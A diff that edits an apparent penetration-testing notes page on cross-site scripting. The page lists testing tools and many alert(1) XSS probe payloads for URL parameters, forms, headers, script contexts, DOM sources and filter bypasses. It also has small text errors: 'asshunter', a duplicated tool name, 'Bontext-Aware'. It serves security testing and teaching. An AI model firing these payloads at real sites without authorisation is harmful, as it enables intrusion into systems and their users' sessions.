@@ -1,15 +1,15 @@
 ---
 title: Cross-Site Scripting (XSS)
+category: Web-Attacks
 tags: [recon, exploit, webvuln, xss, payload]
-tools: [many]
-notes: "XSS ttp"
+tools: ['xsstrike', 'xsstrike', 'knoxss', 'asshunter', 'beef']
 ---
 
 # Cross-Site Scripting (XSS)
 
 **Cross-Site Scripting (XSS)** is a web security  vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in the victim's  browser within the security context of the vulnerable website.
 
-## How It Works
+## How
 
 XSS occurs when a web application includes untrusted data in a web page  without proper validation or escaping. For example, when a website  reflects user input:
 
@@ -25,6 +25,18 @@ An attacker might input: `<script>alert(1)</script>`, resulting in:
 
 This script executes in the victim's browser with the same privileges as the legitimate website scripts.
 
+---
+
+## Tools
+
+| Tool                                                      | Description            | Primary Use Case      |
+| --------------------------------------------------------- | ---------------------- | --------------------- |
+| [XSStrike](https://github.com/s0md3v/XSStrike)            | Advanced XSS detection | Automated scanning    |
+| [KNOXSS](https://knoxss.pro/)                             | Online XSS discovery   | Quick testing         |
+| [XSSHunter](https://github.com/trufflesecurity/xsshunter) | Blind XSS detection    | Delayed XSS finding   |
+| [BeEF](https://github.com/beefproject/beef)               | Browser exploitation   | Post-XSS exploitation |
+| [DOMPurify](https://github.com/cure53/DOMPurify)          | XSS sanitization       | Prevention testing    |
+
 ## Detection
 
 ### Manual Testing
@@ -34,17 +46,17 @@ This script executes in the victim's browser with the same privileges as the leg
 Test user input being reflected in the page through URL parameters:
 
 ```javascript
-# Step 1: Identify reflection points in URL parameters
+# Identify reflection points in URL parameters
 site.com/page?search=TEST     # Search parameters
 site.com/page?name=TEST       # User input fields
 site.com/page?id=TEST         # ID parameters
 
-# Step 2: Test basic XSS payload in each parameter
+# Test basic XSS payload in each parameter
 site.com/page?search=<script>alert(1)</script>
 site.com/page?name="><script>alert(1)</script>
 site.com/page?id=</script><script>alert(1)</script>
 
-# Step 3: Check if payload executes or gets reflected
+# Check if payload executes or gets reflected
 # - If script executes: Direct XSS possible
 # - If script is visible: HTML encoding might be in place
 # - If script disappears: Filtering is active
@@ -55,12 +67,12 @@ site.com/page?id=</script><script>alert(1)</script>
 Test all input fields in forms for XSS:
 
 ```javascript
-# Step 1: Identify form fields
+# Identify form fields
 <input type="text">           # Text inputs
 <input type="search">         # Search boxes
 <textarea>                    # Text areas
 
-# Step 2: Test each field with detection payloads
+# Test each field with detection payloads
 "><img src=x onerror=alert(1)>    # Tests quote escape
 '><img src=x onerror=alert(1)>    # Tests single quote escape
 javascript:alert(1)                # Tests href attributes
@@ -76,16 +88,16 @@ javascript:alert(1)                # Tests href attributes
 Test headers that might be reflected in the response:
 
 ```javascript
-# Step 1: Test common reflected headers
+# Test common reflected headers
 User-Agent: <script>alert(1)</script>
 Referer: <script>alert(1)</script>
 Cookie: <script>alert(1)</script>
 
-# Step 2: Test custom headers
+# Test custom headers
 X-Forwarded-For: <script>alert(1)</script>
 X-Forwarded-Host: <script>alert(1)</script>
 
-# Step 3: Check response headers and body
+# Check response headers and body
 # - Look for header values in page source
 # - Check for reflections in error messages
 ```
@@ -95,17 +107,17 @@ X-Forwarded-Host: <script>alert(1)</script>
 Test payloads based on where input is reflected:
 
 ```javascript
-# Step 1: Inside HTML tags
+# Inside HTML tags
 Original: <div>USER_INPUT</div>
 Test with: <script>alert(1)</script>
 Test with: <img src=x onerror=alert(1)>
 
-# Step 2: Inside HTML attributes
+# Inside HTML attributes
 Original: <input value="USER_INPUT">
 Test with: "><script>alert(1)</script>
 Test with: " autofocus onfocus="alert(1)
 
-# Step 3: Inside script tags
+# Inside script tags
 Original: <script>var name = 'USER_INPUT';</script>
 Test with: ';alert(1);//
 Test with: \';alert(1);//
@@ -116,17 +128,17 @@ Test with: \';alert(1);//
 Test when input is reflected within JavaScript code:
 
 ```javascript
-# Step 1: Inside JavaScript strings
+# Inside JavaScript strings
 Original: var user = "USER_INPUT";
 Test with: ";alert(1);//
 Test with: \";alert(1);//
 
-# Step 2: Inside JavaScript code
+# Inside JavaScript code
 Original: var id = USER_INPUT;
 Test with: alert(1)//
 Test with: (alert(1))//
 
-# Step 3: Inside JavaScript functions
+# Inside JavaScript functions
 Original: callback('USER_INPUT')
 Test with: ');alert(1);//
 Test with: '});alert(1);//
@@ -137,15 +149,15 @@ Test with: '});alert(1);//
 Test common DOM-based XSS sources:
 
 ```javascript
-# Step 1: Test URL fragments
+# Test URL fragments
 site.com/page#<img src=x onerror=alert(1)>
 site.com/page#javascript:alert(1)
 
-# Step 2: Test localStorage/sessionStorage
+# Test localStorage/sessionStorage
 > localStorage.setItem('test', '<img src=x onerror=alert(1)>');
 > sessionStorage.setItem('test', '<img src=x onerror=alert(1)>');
 
-# Step 3: Test document.write sources
+# Test document.write sources
 site.com/page?name=<div onmouseover='alert(1)'>
 site.com/page?name=</script><script>alert(1)</script>
 ```
@@ -153,7 +165,7 @@ site.com/page?name=</script><script>alert(1)</script>
 ### Using XSStrike
 
 ```bash
-# Step 1: Basic scan
+# Basic scan
 xsstrike -u "http://target.com/page?param=value"
 
 # Step 2: Advanced scanning options
@@ -482,7 +494,7 @@ URL.createObjectURL(new Blob(['<script>alert(1)</script>'],{type:'text/html'}))
 </script>
 ```
 
-\### Modern Framework Bypass Targeting popular JavaScript frameworks:
+### Modern Framework Bypass Targeting popular JavaScript frameworks:
 
 ```js
 # Vue Template Injection
@@ -529,7 +541,7 @@ Techniques to bypass regex-based filters:
 <x onclick="&#0097;lert(1)">click</x>
 ```
 
-\### Context-Aware Bypass
+### Bontext-Aware Bypass
 
 ```html
 # CSS Context
@@ -542,13 +554,3 @@ Techniques to bypass regex-based filters:
 # Math Context
 <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><path id="</style><img onerror='alert(1)'"></mglyph></mtext></math>
 ```
-
-## Common Tools
-
-| Tool      | Description            | Primary Use Case      |
-| --------- | ---------------------- | --------------------- |
-| XSStrike  | Advanced XSS detection | Automated scanning    |
-| KNOXSS    | Online XSS discovery   | Quick testing         |
-| XSSHunter | Blind XSS detection    | Delayed XSS finding   |
-| BeEF      | Browser exploitation   | Post-XSS exploitation |
-| DOMPurify | XSS sanitization       | Prevention testing    |
